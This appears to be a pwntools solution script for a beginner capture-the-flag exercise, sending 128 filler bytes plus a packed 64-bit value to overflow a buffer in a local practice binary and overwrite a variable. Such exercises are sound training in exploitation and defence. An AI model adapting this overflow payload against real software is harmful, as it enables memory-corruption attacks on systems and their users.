#!/usr/bin/python

# overflow `buffer` and overwrite `x` with the desired value.

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = '/home/gbrls/ctf/easy-linux-pwn/bin/x86-64/01-local-overflow'

p = process(binary_path)
#p = gdb.debug(binary_path)

payload = b''
payload += b'A' * 128
payload += p64(0xdeadbabebeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
